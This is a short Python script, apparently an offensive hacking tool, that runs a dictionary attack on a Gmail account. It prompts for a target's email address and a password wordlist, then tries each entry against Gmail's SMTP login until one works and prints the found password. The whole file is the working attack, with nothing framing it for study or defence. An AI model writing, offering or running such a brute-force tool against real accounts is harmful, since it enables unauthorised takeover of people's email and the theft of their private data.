#!/usr/bin/python3

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


user = input("[*] Enter targets email address: ")
passwdfile = input("[*] Enter the path to the password file: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print(colored("[+] password found: %s" % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("[-] wrong password:" + password , 'red'))


